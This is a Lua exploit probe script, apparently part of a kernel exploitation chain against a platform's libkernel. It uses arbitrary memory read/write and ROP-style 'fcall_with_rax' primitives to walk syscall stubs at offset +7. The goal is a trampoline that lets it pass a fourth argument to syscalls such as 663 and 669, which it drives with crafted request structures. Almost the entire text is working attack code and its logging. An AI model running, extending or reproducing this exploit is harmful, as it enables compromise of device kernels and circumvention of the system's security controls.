-- CRASH_CLASS: HIGH
-- PROBE 1216a: walk the libkernel stub table and find the first stub whose +7 carries argument 4.
--
-- Established facts:
--   * stub+7 is an instruction boundary for every stub: gettimeofday's wraparound is exactly 7
--     bytes (probe 1183b, sa - stub = 7).
--   * for a stub with >= 4 arguments, 49 89 ca ("mov r10, rcx") sits at +7 and 0f 05 at +10.
--   * rcx arrives through native.fcall_with_rax (probe 1213b, three mov rax,rcx;ret gadgets).
--   * every stub verified so far (0x3B0 0x3F0 0x410 0xB50 0xB70 0xD50 0xFF0 0x10F0) is
--     two-or-three-argument: 663 mode 0 through them returns EINVAL 22.
--   * all eight sit at offset == 0x10 (mod 0x20), which is what a padded stub array looks like.
--
-- So walk every slot == 0x10 (mod 0x20) of the stub region, confirm the slot is a live stub by
-- asking it for our own pid, and then call 663 with mode 0 through it. A stub with >= 4 arguments
-- delivers rcx = 0 as the mode and stops returning EINVAL. One socketpair and one pair of pending
-- requests are reused for the whole walk: a two-or-three-argument stub rejects mode 0 before it
-- touches any request, so the same requests stay usable.

print("=== PROBE 1216a: stub table walk for argument 4 ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local pid0 = N(mk(20)())
local lk = N(libkernel_base)
print(string.format("[0] pid=%d libkernel=0x%X", pid0, lk))

local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("[0] socketpair %d %d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); print("=== DONE ===") return end
local buf  = memory.alloc(0x100)
local ba = 0
do local ok,v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
local reqs = memory.alloc(0x28*2)
local ids  = memory.alloc(16)
local out  = memory.alloc(16)
local tb   = memory.alloc(8)
for i=0,0x28*2-1,4 do wd(reqs+i,0) end
for i=0,1 do
    local r = reqs + i*0x28
    wd(r+0x08,0x10)
    wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
    wd(r+0x20, fd0)
end
wd(ids,0) wd(ids+4,0)
local sv2 = pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(2),uint64(3),uint64(ids)) end)
print(string.format("[0] submit ok=%s id0=0x%08X id1=0x%08X", tostring(sv2), rd(ids), rd(ids+4)))
wd(tb, 2000)

local found, tested = nil, 0
local off = 0x310
while off <= 0x2400 do
    print(string.format("   -> 0x%X", off))
    local okp, v = pcall(function() return N(native.fcall_with_rax(lk + off + 7, 20, 0, 0, 0, 0, 0, 0)) end)
    if okp and v == pid0 then
        tested = tested + 1
        local ok = pcall(function() return native.fcall_with_rax(lk + off + 7, 663, ids, 2, out, 0, tb, 0) end)
        local e = ES()
        print(string.format("      STUB ok=%s err=%s out=%08X/%08X", tostring(ok), e, rd(out), rd(out+4)))
        if ok and not e:match("^22") then found = off print("      *** ARG4 ARRIVED ***") break end
    else
        print(string.format("      not a stub (ok=%s pid=%s)", tostring(okp), tostring(v)))
    end
    off = off + 0x20
end
if found then print(string.format("[1] trampoline = libkernel+0x%X" , found)) else print(string.format("[1] no >=4-arg stub in the walked range (%d stubs tested)", tested)) end
print("=== DONE ===")
